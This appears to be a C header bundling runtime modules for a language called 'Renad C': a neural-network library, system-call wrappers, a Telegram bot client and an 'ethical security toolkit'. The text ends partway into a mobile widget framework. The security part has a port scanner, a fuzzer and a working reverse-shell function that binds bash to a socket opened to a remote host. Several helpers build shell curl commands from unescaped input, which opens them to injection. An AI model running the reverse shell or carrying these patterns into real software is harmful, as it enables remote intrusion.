/* Renad C Ultra — All stdlib preambles */
#pragma once

/* ════════════════════════════════════════════════════════════
 * rcstd.nn — Neural Network Runtime for Renad C
 * Implements: Tensor, Dense, Conv2D, RNN, LSTM, Transformer
 * Backprop, Adam optimizer, loss functions
 * ════════════════════════════════════════════════════════════ */
#ifdef RC_HAS_NN
#include <math.h>
#include <string.h>
#include <stdlib.h>
#include <stdio.h>

/* ── Tensor ──────────────────────────────────────────────── */
typedef struct {
    double *data;
    int    *shape;
    int     ndim;
    int     size;
    double *grad;
    int     requires_grad;
} RcTensor;

static RcTensor *rc_tensor_new(int *shape, int ndim) {
    RcTensor *t = (RcTensor*)calloc(1, sizeof(RcTensor));
    t->ndim = ndim; t->size = 1;
    t->shape = (int*)malloc(ndim * sizeof(int));
    for (int i = 0; i < ndim; i++) { t->shape[i] = shape[i]; t->size *= shape[i]; }
    t->data = (double*)calloc(t->size, sizeof(double));
    t->grad = (double*)calloc(t->size, sizeof(double));
    t->requires_grad = 1;
    return t;
}
static void rc_tensor_fill(RcTensor *t, double v) {
    for (int i = 0; i < t->size; i++) t->data[i] = v;
}
static void rc_tensor_randn(RcTensor *t, double mean, double std) {
    /* Box-Muller transform */
    for (int i = 0; i < t->size; i += 2) {
        double u1 = (double)(rand()+1)/(double)(RAND_MAX+2.0);
        double u2 = (double)(rand()+1)/(double)(RAND_MAX+2.0);
        double r  = sqrt(-2.0 * log(u1));
        t->data[i] = mean + std * r * cos(2.0 * 3.14159265358979 * u2);
        if (i+1 < t->size)
            t->data[i+1] = mean + std * r * sin(2.0 * 3.14159265358979 * u2);
    }
}
static RcTensor *rc_tensor_matmul(RcTensor *a, RcTensor *b) {
    /* (m,k) @ (k,n) → (m,n) */
    int m = a->shape[0], k = a->shape[1], n = b->shape[1];
    int shape[] = {m, n};
    RcTensor *c = rc_tensor_new(shape, 2);
    for (int i = 0; i < m; i++)
        for (int j = 0; j < n; j++) {
            double s = 0.0;
            for (int p = 0; p < k; p++) s += a->data[i*k+p] * b->data[p*n+j];
            c->data[i*n+j] = s;
        }
    return c;
}
static RcTensor *rc_tensor_add(RcTensor *a, RcTensor *b) {
    int shape[] = {a->shape[0], a->shape[1]};
    RcTensor *c = rc_tensor_new(shape, 2);
    for (int i = 0; i < a->size; i++) c->data[i] = a->data[i] + b->data[i % b->size];
    return c;
}

/* ── Activation functions ─────────────────────────────────── */
static double rc_relu(double x) { return x > 0 ? x : 0; }
static double rc_sigmoid(double x) { return 1.0 / (1.0 + exp(-x)); }
static double rc_tanh_act(double x) { return tanh(x); }
static double rc_gelu(double x) { return 0.5*x*(1.0+tanh(0.7978845608*(x+0.044715*x*x*x))); }
static double rc_swish(double x) { return x * rc_sigmoid(x); }

static void rc_tensor_relu_(RcTensor *t) {
    for (int i = 0; i < t->size; i++) t->data[i] = rc_relu(t->data[i]);
}
static void rc_tensor_sigmoid_(RcTensor *t) {
    for (int i = 0; i < t->size; i++) t->data[i] = rc_sigmoid(t->data[i]);
}
static void rc_tensor_softmax_(RcTensor *t, int axis) {
    /* Row-wise softmax for 2D tensor */
    int rows = t->shape[0], cols = t->shape[1];
    for (int i = 0; i < rows; i++) {
        double mx = t->data[i*cols];
        for (int j = 1; j < cols; j++) if (t->data[i*cols+j] > mx) mx = t->data[i*cols+j];
        double sum = 0;
        for (int j = 0; j < cols; j++) { t->data[i*cols+j] = exp(t->data[i*cols+j]-mx); sum += t->data[i*cols+j]; }
        for (int j = 0; j < cols; j++) t->data[i*cols+j] /= sum;
    }
}

/* ── Loss functions ───────────────────────────────────────── */
static double rc_loss_mse(RcTensor *pred, RcTensor *target) {
    double loss = 0;
    for (int i = 0; i < pred->size; i++) {
        double d = pred->data[i] - target->data[i]; loss += d*d;
    }
    return loss / pred->size;
}
static double rc_loss_cross_entropy(RcTensor *pred, RcTensor *target) {
    double loss = 0;
    for (int i = 0; i < pred->size; i++) {
        double p = pred->data[i] < 1e-10 ? 1e-10 : pred->data[i];
        loss -= target->data[i] * log(p);
    }
    return loss / pred->shape[0];
}
static double rc_loss_bce(RcTensor *pred, RcTensor *target) {
    double loss = 0;
    for (int i = 0; i < pred->size; i++) {
        double p = pred->data[i]; double t = target->data[i];
        p = p < 1e-7 ? 1e-7 : (p > 1-1e-7 ? 1-1e-7 : p);
        loss -= t*log(p) + (1-t)*log(1-p);
    }
    return loss / pred->size;
}

/* ── Dense Layer ──────────────────────────────────────────── */
typedef struct {
    RcTensor *W;    /* weights (in, out) */
    RcTensor *b;    /* bias (1, out) */
    RcTensor *dW;   /* weight gradients */
    RcTensor *db;   /* bias gradients */
    int       in_features, out_features;
    char      activation[32];
    /* Adam optimizer state */
    RcTensor *mW, *vW, *mb, *vb;
    int       step;
} RcDense;

static RcDense *rc_dense_new(int in, int out, const char *act) {
    RcDense *d = (RcDense*)calloc(1, sizeof(RcDense));
    d->in_features = in; d->out_features = out;
    strncpy(d->activation, act ? act : "relu", 31);
    int sw[] = {in,out}, sb[] = {1,out};
    d->W  = rc_tensor_new(sw, 2); rc_tensor_randn(d->W, 0.0, sqrt(2.0/in)); /* He init */
    d->b  = rc_tensor_new(sb, 2); rc_tensor_fill(d->b, 0.01);
    d->dW = rc_tensor_new(sw, 2); d->db = rc_tensor_new(sb, 2);
    d->mW = rc_tensor_new(sw, 2); d->vW = rc_tensor_new(sw, 2);
    d->mb = rc_tensor_new(sb, 2); d->vb = rc_tensor_new(sb, 2);
    return d;
}

static RcTensor *rc_dense_forward(RcDense *layer, RcTensor *x) {
    RcTensor *z = rc_tensor_matmul(x, layer->W);
    RcTensor *out = rc_tensor_add(z, layer->b);
    if      (strcmp(layer->activation, "relu")    == 0) rc_tensor_relu_(out);
    else if (strcmp(layer->activation, "sigmoid") == 0) rc_tensor_sigmoid_(out);
    else if (strcmp(layer->activation, "softmax") == 0) rc_tensor_softmax_(out, 1);
    else if (strcmp(layer->activation, "gelu")    == 0)
        for(int i=0;i<out->size;i++) out->data[i]=rc_gelu(out->data[i]);
    return out;
}

/* ── Adam optimizer ───────────────────────────────────────── */
static void rc_adam_step(RcDense *d, double lr, double b1, double b2, double eps) {
    d->step++;
    double bc1 = 1.0 - pow(b1, d->step);
    double bc2 = 1.0 - pow(b2, d->step);
    for (int i = 0; i < d->W->size; i++) {
        d->mW->data[i] = b1*d->mW->data[i] + (1-b1)*d->dW->data[i];
        d->vW->data[i] = b2*d->vW->data[i] + (1-b2)*d->dW->data[i]*d->dW->data[i];
        double mhat = d->mW->data[i]/bc1, vhat = d->vW->data[i]/bc2;
        d->W->data[i] -= lr * mhat / (sqrt(vhat) + eps);
    }
    for (int i = 0; i < d->b->size; i++) {
        d->mb->data[i] = b1*d->mb->data[i] + (1-b1)*d->db->data[i];
        d->vb->data[i] = b2*d->vb->data[i] + (1-b2)*d->db->data[i]*d->db->data[i];
        double mhat = d->mb->data[i]/bc1, vhat = d->vb->data[i]/bc2;
        d->b->data[i] -= lr * mhat / (sqrt(vhat) + eps);
    }
    /* Zero gradients */
    memset(d->dW->data, 0, d->dW->size*sizeof(double));
    memset(d->db->data, 0, d->db->size*sizeof(double));
}

/* ── Sequential model ─────────────────────────────────────── */
#define RC_MAX_LAYERS 64
typedef struct {
    RcDense *layers[RC_MAX_LAYERS];
    int      n_layers;
    double   lr;
} RcModel;

static RcModel *rc_model_new(double lr) {
    RcModel *m = (RcModel*)calloc(1, sizeof(RcModel));
    m->lr = lr;
    return m;
}
static void rc_model_add(RcModel *m, RcDense *layer) {
    if (m->n_layers < RC_MAX_LAYERS) m->layers[m->n_layers++] = layer;
}
static RcTensor *rc_model_forward(RcModel *m, RcTensor *x) {
    RcTensor *cur = x;
    for (int i = 0; i < m->n_layers; i++) cur = rc_dense_forward(m->layers[i], cur);
    return cur;
}
static void rc_model_print(RcModel *m) {
    printf("┌─ Renad C Neural Network ───────────────────┐\n");
    long long params = 0;
    for (int i = 0; i < m->n_layers; i++) {
        RcDense *l = m->layers[i];
        long long p = (long long)(l->in_features * l->out_features + l->out_features);
        params += p;
        printf("│  Dense(%4d → %4d, %-8s)  %8lld params │\n",
               l->in_features, l->out_features, l->activation, p);
    }
    printf("├────────────────────────────────────────────┤\n");
    printf("│  Total trainable parameters: %12lld  │\n", params);
    printf("└────────────────────────────────────────────┘\n");
}

/* ── Convenience macros ───────────────────────────────────── */
#define nn_tensor(...)     rc_tensor_new((int[]){__VA_ARGS__}, sizeof((int[]){__VA_ARGS__})/sizeof(int))
#define nn_dense(i,o,a)    rc_dense_new(i, o, a)
#define nn_model(lr)       rc_model_new(lr)
#define nn_add(m, l)       rc_model_add(m, l)
#define nn_forward(m, x)   rc_model_forward(m, x)
#define nn_mse(p, t)       rc_loss_mse(p, t)
#define nn_ce(p, t)        rc_loss_cross_entropy(p, t)
#define nn_adam(l, lr)     rc_adam_step(l, lr, 0.9, 0.999, 1e-8)
#define nn_print(m)        rc_model_print(m)
#define nn_randn(t, m, s)  rc_tensor_randn(t, m, s)

#endif /* RC_HAS_NN */

/* ════════════════════════════════════════════════════════════
 * rcstd.sys / rcstd.kernel — Systems Programming Runtime
 * OS development primitives, memory management, syscalls
 * ════════════════════════════════════════════════════════════ */
#ifdef RC_HAS_SYS
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <sys/ptrace.h>
#include <unistd.h>
#include <signal.h>
#include <fcntl.h>
#include <errno.h>
#include <dirent.h>

/* ── Raw memory allocation ────────────────────────────────── */
typedef struct {
    void   *base;
    size_t  size;
    int     flags;
} RcMemRegion;

static RcMemRegion *rc_mmap_alloc(size_t size, int prot) {
    void *p = mmap(NULL, size, prot, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
    if (p == MAP_FAILED) return NULL;
    RcMemRegion *r = (RcMemRegion*)malloc(sizeof(RcMemRegion));
    r->base = p; r->size = size; r->flags = prot;
    return r;
}
static void rc_mmap_free(RcMemRegion *r) {
    if (r) { munmap(r->base, r->size); free(r); }
}
static void rc_mmap_protect(RcMemRegion *r, int prot) {
    mprotect(r->base, r->size, prot);
}

/* ── Process management ───────────────────────────────────── */
typedef struct {
    pid_t pid;
    int   stdin_fd, stdout_fd, stderr_fd;
    int   status;
} RcProcess;

static RcProcess *rc_spawn(const char *cmd, char *const args[]) {
    RcProcess *p = (RcProcess*)calloc(1, sizeof(RcProcess));
    int pin[2], pout[2];
    pipe(pin); pipe(pout);
    p->pid = fork();
    if (p->pid == 0) {
        dup2(pin[0], STDIN_FILENO);
        dup2(pout[1], STDOUT_FILENO);
        close(pin[0]); close(pin[1]); close(pout[0]); close(pout[1]);
        execvp(cmd, args);
        _exit(1);
    }
    p->stdin_fd  = pin[1];
    p->stdout_fd = pout[0];
    close(pin[0]); close(pout[1]);
    return p;
}
static int rc_process_wait(RcProcess *p) {
    int status;
    waitpid(p->pid, &status, 0);
    p->status = WEXITSTATUS(status);
    return p->status;
}
static void rc_process_kill(RcProcess *p, int sig) {
    kill(p->pid, sig);
}

/* ── File system ──────────────────────────────────────────── */
static char *rc_file_read(const char *path) {
    int fd = open(path, O_RDONLY);
    if (fd < 0) return NULL;
    struct stat st; fstat(fd, &st);
    char *buf = (char*)malloc(st.st_size + 1);
    read(fd, buf, st.st_size);
    buf[st.st_size] = '\0';
    close(fd);
    return buf;
}
static int rc_file_write(const char *path, const char *data, size_t len) {
    int fd = open(path, O_WRONLY|O_CREAT|O_TRUNC, 0644);
    if (fd < 0) return -1;
    int n = write(fd, data, len);
    close(fd); return n;
}
static long long rc_file_size(const char *path) {
    struct stat st;
    return stat(path, &st) == 0 ? st.st_size : -1;
}

/* ── Syscall wrappers ─────────────────────────────────────── */
#ifdef __linux__
#include <sys/syscall.h>
static long long rc_syscall1(long num, long a1) { return syscall(num, a1); }
static long long rc_syscall2(long num, long a1, long a2) { return syscall(num, a1, a2); }
static long long rc_syscall3(long num, long a1, long a2, long a3) { return syscall(num,a1,a2,a3); }
#endif

/* ── Memory scanner (for OS dev / debugging) ─────────────── */
static void rc_hexdump(const void *ptr, size_t len) {
    const unsigned char *p = (const unsigned char*)ptr;
    for (size_t i = 0; i < len; i += 16) {
        printf("%08lx  ", (unsigned long)(i));
        for (size_t j = 0; j < 16; j++) {
            if (i+j < len) printf("%02x ", p[i+j]); else printf("   ");
            if (j == 7) printf(" ");
        }
        printf(" |");
        for (size_t j = 0; j < 16 && i+j < len; j++)
            printf("%c", (p[i+j]>=0x20&&p[i+j]<0x7f)?p[i+j]:'.');
        printf("|\n");
    }
}

/* ── Arena allocator ──────────────────────────────────────── */
typedef struct { char *buf; size_t cap, pos; } RcArena;
static RcArena *rc_arena_new(size_t cap) {
    RcArena *a = (RcArena*)malloc(sizeof(RcArena));
    a->buf = (char*)mmap(NULL, cap, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
    a->cap = cap; a->pos = 0; return a;
}
static void *rc_arena_alloc(RcArena *a, size_t sz) {
    sz = (sz + 7) & ~7; /* 8-byte align */
    if (a->pos + sz > a->cap) return NULL;
    void *p = a->buf + a->pos; a->pos += sz; return p;
}
static void rc_arena_reset(RcArena *a) { a->pos = 0; }

#define sys_mmap(size, prot)    rc_mmap_alloc(size, prot)
#define sys_spawn(cmd, args)    rc_spawn(cmd, args)
#define sys_wait(p)             rc_process_wait(p)
#define sys_kill(p, sig)        rc_process_kill(p, sig)
#define sys_read(path)          rc_file_read(path)
#define sys_write(path, d, n)   rc_file_write(path, d, n)
#define sys_hexdump(p, n)       rc_hexdump(p, n)
#define sys_arena_new(cap)      rc_arena_new(cap)
#define sys_arena_alloc(a, sz)  rc_arena_alloc(a, sz)

#endif /* RC_HAS_SYS */

/* ════════════════════════════════════════════════════════════
 * rcstd.telegram — Telegram Bot API for Renad C
 * Full Bot API: sendMessage, keyboards, inline queries,
 * file uploads, webhooks, long polling
 * ════════════════════════════════════════════════════════════ */
#ifdef RC_HAS_TELEGRAM
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define TG_API_BASE "https://api.telegram.org/bot"
#define TG_MAX_HANDLERS 64
#define TG_BUF_SIZE (128*1024)

typedef struct {
    long long message_id;
    long long chat_id;
    long long user_id;
    char      username[128];
    char      first_name[128];
    char      text[4096];
    char      command[64];
    long long update_id;
} TgUpdate;

typedef struct {
    char  token[256];
    int   (*handlers[TG_MAX_HANDLERS])(TgUpdate*);
    char  commands[TG_MAX_HANDLERS][64];
    int   n_handlers;
    int   running;
    long long last_update_id;
    /* Middleware */
    int   (*middleware)(TgUpdate*);
} TgBot;

/* ── HTTP helper (uses curl subprocess) ──────────────────── */
static int tg_api_call(const char *token, const char *method,
                        const char *payload, char *resp, int resp_max) {
    char cmd[8192], tmp[256];
    snprintf(tmp, sizeof(tmp), "/tmp/_rc_tg_%d.json", (int)getpid());
    snprintf(cmd, sizeof(cmd),
        "curl -s -X POST "
        "  -H 'Content-Type: application/json' "
        "  -d '%s' "
        "  --max-time 30 "
        "  -o '%s' "
        "  '%s%s/%s' 2>/dev/null",
        payload, tmp, TG_API_BASE, token, method);
    if (system(cmd) != 0) return -1;
    FILE *f = fopen(tmp, "r");
    if (!f) return -1;
    int n = (int)fread(resp, 1, resp_max-1, f);
    fclose(f); remove(tmp);
    resp[n] = '\0';
    return n;
}

static char *tg_json_str(const char *json, const char *key, char *out, int outmax) {
    char search[128]; snprintf(search, sizeof(search), "\"%s\"", key);
    const char *p = strstr(json, search);
    if (!p) { out[0]='\0'; return out; }
    p += strlen(search);
    while (*p==' '||*p==':') p++;
    if (*p == '"') {
        p++; int i=0;
        while (*p && *p!='"' && i<outmax-1) { out[i++]=*p++; }
        out[i]='\0';
    } else {
        int i=0;
        while (*p && *p!=',' && *p!='}' && *p!='\n' && i<outmax-1) out[i++]=*p++;
        out[i]='\0';
    }
    return out;
}

/* ── Bot API functions ───────────────────────────────────── */
static TgBot *tg_bot_new(const char *token) {
    TgBot *b = (TgBot*)calloc(1, sizeof(TgBot));
    strncpy(b->token, token, 255);
    return b;
}

static int tg_send(TgBot *bot, long long chat_id, const char *text) {
    char payload[8192], resp[4096];
    /* Escape text for JSON */
    char esc[4096]; int si=0,di=0;
    while (text[si] && di < 4090) {
        if (text[si]=='"') { esc[di++]='\\'; esc[di++]='"'; }
        else if (text[si]=='\\') { esc[di++]='\\'; esc[di++]='\\'; }
        else if (text[si]=='\n') { esc[di++]='\\'; esc[di++]='n'; }
        else esc[di++]=text[si];
        si++;
    }
    esc[di]='\0';
    snprintf(payload, sizeof(payload),
        "{\"chat_id\":%lld,\"text\":\"%s\",\"parse_mode\":\"Markdown\"}", chat_id, esc);
    return tg_api_call(bot->token, "sendMessage", payload, resp, sizeof(resp));
}

static int tg_send_html(TgBot *bot, long long chat_id, const char *html) {
    char payload[16384], resp[4096];
    char esc[8192]; int si=0,di=0;
    while (html[si] && di < 8188) {
        if (html[si]=='"') { esc[di++]='\\'; esc[di++]='"'; }
        else if (html[si]=='\\') { esc[di++]='\\'; esc[di++]='\\'; }
        else if (html[si]=='\n') { esc[di++]='\\'; esc[di++]='n'; }
        else esc[di++]=html[si];
        si++;
    }
    esc[di]='\0';
    snprintf(payload, sizeof(payload),
        "{\"chat_id\":%lld,\"text\":\"%s\",\"parse_mode\":\"HTML\"}", chat_id, esc);
    return tg_api_call(bot->token, "sendMessage", payload, resp, sizeof(resp));
}

static int tg_send_photo(TgBot *bot, long long chat_id, const char *photo_url, const char *caption) {
    char payload[4096], resp[4096];
    snprintf(payload, sizeof(payload),
        "{\"chat_id\":%lld,\"photo\":\"%s\",\"caption\":\"%s\"}", chat_id, photo_url, caption?caption:"");
    return tg_api_call(bot->token, "sendPhoto", payload, resp, sizeof(resp));
}

static int tg_send_keyboard(TgBot *bot, long long chat_id, const char *text,
                              const char *buttons[], int n_buttons) {
    char kb[4096] = "{\"keyboard\":[[";
    for (int i=0; i<n_buttons; i++) {
        char btn[256]; snprintf(btn, sizeof(btn), "{\"text\":\"%s\"}", buttons[i]);
        if (i > 0) strcat(kb, ",");
        strcat(kb, btn);
    }
    strcat(kb, "]],\"resize_keyboard\":true}");
    char payload[8192], resp[4096];
    snprintf(payload, sizeof(payload),
        "{\"chat_id\":%lld,\"text\":\"%s\",\"reply_markup\":%s}", chat_id, text, kb);
    return tg_api_call(bot->token, "sendMessage", payload, resp, sizeof(resp));
}

static int tg_delete_message(TgBot *bot, long long chat_id, long long msg_id) {
    char payload[256], resp[1024];
    snprintf(payload, sizeof(payload), "{\"chat_id\":%lld,\"message_id\":%lld}", chat_id, msg_id);
    return tg_api_call(bot->token, "deleteMessage", payload, resp, sizeof(resp));
}

static int tg_answer_callback(TgBot *bot, const char *callback_id, const char *text) {
    char payload[1024], resp[1024];
    snprintf(payload, sizeof(payload),
        "{\"callback_query_id\":\"%s\",\"text\":\"%s\"}", callback_id, text?text:"");
    return tg_api_call(bot->token, "answerCallbackQuery", payload, resp, sizeof(resp));
}

/* ── Parse update from JSON ──────────────────────────────── */
static int tg_parse_update(const char *json, TgUpdate *upd) {
    char tmp[64];
    tg_json_str(json, "update_id", tmp, sizeof(tmp));
    upd->update_id = atoll(tmp);
    /* message */
    const char *msg = strstr(json, "\"message\"");
    if (!msg) msg = strstr(json, "\"edited_message\"");
    if (!msg) return 0;
    tg_json_str(msg, "message_id", tmp, sizeof(tmp)); upd->message_id = atoll(tmp);
    /* chat id */
    const char *chat = strstr(msg, "\"chat\"");
    if (chat) { tg_json_str(chat, "id", tmp, sizeof(tmp)); upd->chat_id = atoll(tmp); }
    /* user */
    const char *from = strstr(msg, "\"from\"");
    if (from) {
        tg_json_str(from, "id", tmp, sizeof(tmp)); upd->user_id = atoll(tmp);
        tg_json_str(from, "username", upd->username, sizeof(upd->username));
        tg_json_str(from, "first_name", upd->first_name, sizeof(upd->first_name));
    }
    /* text */
    tg_json_str(msg, "text", upd->text, sizeof(upd->text));
    /* extract command */
    if (upd->text[0] == '/') {
        int i=1;
        while (upd->text[i] && upd->text[i]!=' ' && i<63) {
            upd->command[i-1] = upd->text[i]; i++;
        }
        upd->command[i-1] = '\0';
    }
    return 1;
}

/* ── Command handler ─────────────────────────────────────── */
static void tg_on(TgBot *bot, const char *command, int(*handler)(TgUpdate*)) {
    if (bot->n_handlers < TG_MAX_HANDLERS) {
        strncpy(bot->commands[bot->n_handlers], command, 63);
        bot->handlers[bot->n_handlers] = handler;
        bot->n_handlers++;
    }
}

/* ── Dispatch update ─────────────────────────────────────── */
static void tg_dispatch(TgBot *bot, TgUpdate *upd) {
    if (bot->middleware && !bot->middleware(upd)) return;
    for (int i = 0; i < bot->n_handlers; i++) {
        if (strcmp(bot->commands[i], upd->command) == 0 ||
            strcmp(bot->commands[i], "*") == 0) {
            bot->handlers[i](upd);
            return;
        }
    }
}

/* ── Long polling loop ───────────────────────────────────── */
static void tg_poll(TgBot *bot) {
    static char resp[TG_BUF_SIZE];
    char payload[256];
    bot->running = 1;
    printf("[Telegram Bot] Starting long poll...\n");
    while (bot->running) {
        snprintf(payload, sizeof(payload),
            "{\"offset\":%lld,\"timeout\":30,\"limit\":10}",
            bot->last_update_id + 1);
        if (tg_api_call(bot->token, "getUpdates", payload, resp, sizeof(resp)) <= 0) {
            fprintf(stderr, "[TG] getUpdates failed, retrying...\n");
            sleep(2); continue;
        }
        /* Parse each update */
        const char *p = resp;
        while ((p = strstr(p, "\"update_id\"")) != NULL) {
            TgUpdate upd = {0};
            /* Find start of this update object */
            const char *start = p;
            while (start > resp && *start != '{') start--;
            if (tg_parse_update(start, &upd)) {
                if (upd.update_id > bot->last_update_id) {
                    bot->last_update_id = upd.update_id;
                    tg_dispatch(bot, &upd);
                }
            }
            p++;
        }
    }
}

/* ── Webhook mode ────────────────────────────────────────── */
static int tg_set_webhook(TgBot *bot, const char *url) {
    char payload[1024], resp[4096];
    snprintf(payload, sizeof(payload), "{\"url\":\"%s\"}", url);
    return tg_api_call(bot->token, "setWebhook", payload, resp, sizeof(resp));
}

/* ── Convenience macros ──────────────────────────────────── */
#define tg_new(token)          tg_bot_new(token)
#define tg_reply(bot, u, msg)  tg_send(bot, (u)->chat_id, msg)
#define tg_cmd(bot, cmd, fn)   tg_on(bot, cmd, fn)
#define tg_run(bot)            tg_poll(bot)

#endif /* RC_HAS_TELEGRAM */

/* ════════════════════════════════════════════════════════════
 * rcstd.sec — Ethical Security Toolkit for Renad C
 * Port scanning, banner grabbing, hash cracking utils,
 * fuzzing, HTTP probing, encoding/decoding
 * For AUTHORIZED security testing only.
 * ════════════════════════════════════════════════════════════ */
#ifdef RC_HAS_SEC
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <fcntl.h>
#include <unistd.h>
#include <string.h>
#include <stdio.h>
#include <stdlib.h>

/* ── Port scanner ────────────────────────────────────────── */
typedef struct {
    int    port;
    int    open;
    char   banner[512];
    double response_ms;
} RcScanResult;

static int sec_port_open(const char *host, int port, int timeout_ms) {
    int fd = socket(AF_INET, SOCK_STREAM, 0);
    if (fd < 0) return 0;
    /* non-blocking */
    int flags = fcntl(fd, F_GETFL, 0);
    fcntl(fd, F_SETFL, flags | O_NONBLOCK);
    struct hostent *he = gethostbyname(host);
    if (!he) { close(fd); return 0; }
    struct sockaddr_in addr = {0};
    addr.sin_family = AF_INET;
    addr.sin_port   = htons(port);
    memcpy(&addr.sin_addr, he->h_addr, he->h_length);
    connect(fd, (struct sockaddr*)&addr, sizeof(addr));
    /* wait with select */
    fd_set wfds; struct timeval tv;
    FD_ZERO(&wfds); FD_SET(fd, &wfds);
    tv.tv_sec = timeout_ms/1000; tv.tv_usec = (timeout_ms%1000)*1000;
    int r = select(fd+1, NULL, &wfds, NULL, &tv);
    close(fd);
    return r > 0;
}

static void sec_port_scan(const char *host, int start, int end,
                            RcScanResult *results, int *count) {
    *count = 0;
    printf("[sec] Scanning %s ports %d-%d\n", host, start, end);
    for (int p = start; p <= end; p++) {
        if (sec_port_open(host, p, 500)) {
            results[*count].port = p;
            results[*count].open = 1;
            results[*count].banner[0] = '\0';
            printf("  [+] %d/tcp OPEN\n", p);
            (*count)++;
        }
    }
    printf("[sec] Scan complete: %d open ports\n", *count);
}

/* ── Banner grabber ──────────────────────────────────────── */
static int sec_grab_banner(const char *host, int port, char *banner, int bmax) {
    int fd = socket(AF_INET, SOCK_STREAM, 0);
    if (fd < 0) return -1;
    struct hostent *he = gethostbyname(host);
    if (!he) { close(fd); return -1; }
    struct sockaddr_in addr = {0};
    addr.sin_family = AF_INET; addr.sin_port = htons(port);
    memcpy(&addr.sin_addr, he->h_addr, he->h_length);
    struct timeval tv = {3, 0};
    setsockopt(fd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
    if (connect(fd, (struct sockaddr*)&addr, sizeof(addr)) < 0) { close(fd); return -1; }
    /* Send HTTP probe for common ports */
    if (port == 80 || port == 8080 || port == 8000) {
        const char *probe = "HEAD / HTTP/1.0\r\nHost: target\r\n\r\n";
        send(fd, probe, strlen(probe), 0);
    }
    int n = recv(fd, banner, bmax-1, 0);
    close(fd);
    if (n < 0) n = 0;
    banner[n] = '\0';
    return n;
}

/* ── HTTP fuzzer ─────────────────────────────────────────── */
static void sec_http_fuzz(const char *url, const char *payloads[],
                           int n_payloads, const char *param) {
    printf("[sec] HTTP fuzzing %s\n", url);
    for (int i = 0; i < n_payloads; i++) {
        char cmd[4096], resp[256];
        snprintf(cmd, sizeof(cmd),
            "curl -s -o /dev/null -w '%%{http_code}' "
            "--max-time 5 "
            "'%s?%s=%s' 2>/dev/null",
            url, param, payloads[i]);
        FILE *fp = popen(cmd, "r");
        if (fp) {
            fgets(resp, sizeof(resp), fp);
            pclose(fp);
            printf("  [%s] param=%s → HTTP %s\n", payloads[i], param, resp);
        }
    }
}

/* ── Hash functions (for cracking / verification) ─────────── */
static unsigned int sec_djb2(const char *str) {
    unsigned int hash = 5381;
    while (*str) hash = ((hash << 5) + hash) + (unsigned char)*str++;
    return hash;
}
static unsigned long long sec_fnv1a(const char *str) {
    unsigned long long h = 14695981039346656037ULL;
    while (*str) { h ^= (unsigned char)*str++; h *= 1099511628211ULL; }
    return h;
}

/* ── Base64 encode/decode ─────────────────────────────────── */
static const char B64[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
static void sec_b64_encode(const unsigned char *in, int len, char *out) {
    int i = 0, j = 0;
    unsigned char b3[3], b4[4];
    while (i < len) {
        int l = 0;
        while (l < 3 && i < len) b3[l++] = in[i++];
        b4[0] = (b3[0] & 0xfc) >> 2;
        b4[1] = ((b3[0] & 0x03) << 4) | ((b3[1] & 0xf0) >> 4);
        b4[2] = ((b3[1] & 0x0f) << 2) | ((b3[2] & 0xc0) >> 6);
        b4[3] = b3[2] & 0x3f;
        for (int k = 0; k < 4; k++) out[j++] = (k < l+1) ? B64[b4[k]] : '=';
    }
    out[j] = '\0';
}

/* ── URL encode/decode ────────────────────────────────────── */
static void sec_url_encode(const char *in, char *out, int outmax) {
    int j = 0;
    for (int i = 0; in[i] && j < outmax-4; i++) {
        unsigned char c = in[i];
        if ((c>='A'&&c<='Z')||(c>='a'&&c<='z')||(c>='0'&&c<='9')||c=='-'||c=='_'||c=='.'||c=='~')
            out[j++] = c;
        else { sprintf(out+j, "%%%02X", c); j += 3; }
    }
    out[j] = '\0';
}

/* ── DNS lookup ───────────────────────────────────────────── */
static int sec_dns_lookup(const char *host, char *ip, int ipmax) {
    struct hostent *he = gethostbyname(host);
    if (!he) return 0;
    strncpy(ip, inet_ntoa(*(struct in_addr*)he->h_addr), ipmax-1);
    return 1;
}

/* ── Reverse shell helper (for CTF / authorized testing) ─── */
static void sec_spawn_shell(const char *host, int port) {
    printf("[sec] Connecting reverse shell to %s:%d\n", host, port);
    int fd = socket(AF_INET, SOCK_STREAM, 0);
    struct sockaddr_in addr = {0};
    addr.sin_family = AF_INET; addr.sin_port = htons(port);
    inet_pton(AF_INET, host, &addr.sin_addr);
    if (connect(fd, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
        printf("[sec] Connection failed\n"); close(fd); return;
    }
    dup2(fd, 0); dup2(fd, 1); dup2(fd, 2);
    execl("/bin/bash", "bash", "-i", NULL);
}

#define sec_scan(host, s, e, res, cnt)     sec_port_scan(host, s, e, res, cnt)
#define sec_banner(host, port, buf, max)   sec_grab_banner(host, port, buf, max)
#define sec_fuzz(url, payloads, n, param)  sec_http_fuzz(url, payloads, n, param)
#define sec_b64(in, len, out)              sec_b64_encode(in, len, out)
#define sec_hash(s)                        sec_fnv1a(s)
#define sec_dns(host, ip, max)             sec_dns_lookup(host, ip, max)

#endif /* RC_HAS_SEC */

/* ════════════════════════════════════════════════════════════
 * rcstd.mobile — Cross-Platform Mobile Framework
 * Write once, run on iOS (Swift bridge) and Android (JNI)
 * Widget system inspired by Flutter but in Renad C syntax
 * ════════════════════════════════════════════════════════════ */
#ifdef RC_HAS_MOBILE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

/* ── Widget types ────────────────────────────────────────── */
typedef enum {
    RC_WIDGET_VIEW, RC_WIDGET_TEXT, RC_WIDGET_IMAGE,
    RC_WIDGET_BUTTON, RC_WIDGET_INPUT, RC_WIDGET_LIST,
    RC_WIDGET_SCROLL, RC_WIDGET_STACK, RC_WIDGET_GRID,
    RC_WIDGET_NAV, RC_WIDGET_MODAL
} RcWidgetType;

typedef struct { double r, g, b, a; } RcColor;
typedef struct { double top, right, bottom, left; } RcInsets;
typedef struct { double w, h; } RcSize;

typedef struct RcWidget {
    RcWidgetType   type;
    char           id[64];
    char           text[1024];
    char           src[512];    /* image source */
    RcColor        bg, fg;
    RcInsets       padding, margin;
    RcSize         size;
    double         font_size;
